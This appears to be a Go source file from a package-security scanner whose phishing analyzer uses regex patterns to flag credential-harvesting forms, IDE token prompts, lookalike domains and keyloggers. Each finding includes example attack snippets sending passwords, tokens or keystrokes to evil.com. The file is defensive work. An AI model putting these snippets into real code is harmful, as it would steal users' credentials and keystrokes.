package analyzer

import (
	"fmt"
	"regexp"
	"strings"
)

// PhishingAnalyzer detects phishing infrastructure patterns including fake
// login forms, credential harvesting, domain spoofing, and keylogging.
// Based on Aikido/Socket.dev research on npm phishing campaigns targeting developers.
type PhishingAnalyzer struct{}

func NewPhishingAnalyzer() *PhishingAnalyzer {
	return &PhishingAnalyzer{}
}

func (a *PhishingAnalyzer) Name() string {
	return "phishing"
}

var (
	// Password input creation in code
	passwordInputPattern = regexp.MustCompile(`(?i)type\s*[=:]\s*['"]password['"]|showInputBox\s*\(\s*\{[^}]*password\s*:\s*true`)

	// Form with external action URL
	formActionPattern = regexp.MustCompile(`(?i)action\s*=\s*['"]https?://`)

	// Known service domain impersonation
	domainSpoofPattern = regexp.MustCompile(`(?i)(?:github|npmjs|microsoft|google|aws|azure|gitlab|bitbucket|docker)[-.](?:auth|login|oauth|token|verify|secure|account)[^.]*\.`)

	// Keydown/keypress event listeners with exfiltration
	keyloggerPattern = regexp.MustCompile(`(?i)addEventListener\s*\(\s*['"]key(?:down|press|up)['"]`)

	// IDE extension credential prompting
	ideCredentialPattern = regexp.MustCompile(`(?i)showInputBox|showQuickPick|window\.show(?:Information|Warning)Message`)

	// Credential-related keywords near exfil
	credentialKeywords = regexp.MustCompile(`(?i)(?:password|token|secret|api.?key|auth|credential|session|cookie)`)
)

func (a *PhishingAnalyzer) scanContent(content string, filename string) []Finding {
	var findings []Finding

	hasPasswordInput := passwordInputPattern.MatchString(content)
	hasFormAction := formActionPattern.MatchString(content)
	hasDomainSpoof := domainSpoofPattern.MatchString(content)
	hasKeylogger := keyloggerPattern.MatchString(content)
	hasIDECred := ideCredentialPattern.MatchString(content)
	hasCredKeywords := credentialKeywords.MatchString(content)
	hasExfil := strings.Contains(content, "fetch(") ||
		strings.Contains(content, "sendBeacon") ||
		strings.Contains(content, "XMLHttpRequest") ||
		strings.Contains(content, "https.request")

	// Fake login form (password input + form action to external URL)
	if hasPasswordInput && (hasFormAction || hasExfil) {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Phishing: credential harvesting form",
			Description: fmt.Sprintf("File %q creates password input fields and submits to external URLs. This is a credential phishing attack.", filename),
			Severity:    SeverityCritical,
			ExploitExample: "Credential phishing:\n" +
				"    document.body.innerHTML = '<form action=\"https://evil.com\">' +\n" +
				"        '<input type=\"password\" name=\"pw\">' +\n" +
				"        '<button>Login</button></form>';\n" +
				"    User enters credentials, sent to attacker.",
			Remediation: "This is a phishing attack. Remove the package immediately. Check if any credentials were entered.",
		})
	}

	// IDE credential harvesting (VS Code extension pattern)
	if hasIDECred && hasCredKeywords && hasExfil {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "IDE credential harvesting detected",
			Description: fmt.Sprintf("File %q prompts for credentials via IDE dialogs and exfiltrates them. This targets developers in their coding environment.", filename),
			Severity:    SeverityCritical,
			ExploitExample: "IDE phishing:\n" +
				"    vscode.window.showInputBox({\n" +
				"        prompt: 'Enter GitHub token',\n" +
				"        password: true\n" +
				"    }).then(token => fetch('https://evil.com', {body: token}));",
			Remediation: "Never enter credentials in prompts from extensions. Revoke any tokens that may have been captured.",
		})
	}

	// Domain spoofing
	if hasDomainSpoof {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Domain spoofing: lookalike service URLs",
			Description: fmt.Sprintf("File %q contains URLs that impersonate known services (GitHub, npm, Microsoft, etc.) using lookalike domains.", filename),
			Severity:    SeverityHigh,
			ExploitExample: "Domain spoofing:\n" +
				"    // Looks like GitHub but isn't:\n" +
				"    fetch('https://github-auth.evil.com/oauth');\n" +
				"    // Looks like npm registry:\n" +
				"    fetch('https://registry-npmjs.evil.com/login');",
			Remediation: "Verify all URLs point to legitimate domains. Report the phishing domain.",
		})
	}

	// Keylogger pattern
	if hasKeylogger && hasExfil {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Keylogger: keystroke capture with exfiltration",
			Description: fmt.Sprintf("File %q captures keyboard events and sends data to an external server. This is a keylogging attack.", filename),
			Severity:    SeverityCritical,
			ExploitExample: "Keylogger:\n" +
				"    document.addEventListener('keydown', (e) => {\n" +
				"        sendBeacon('https://evil.com', e.key);\n" +
				"    });\n" +
				"    Captures every keystroke including passwords.",
			Remediation: "This is a keylogger. Remove immediately. Change passwords for any accounts used while this was active.",
		})
	}

	return findings
}
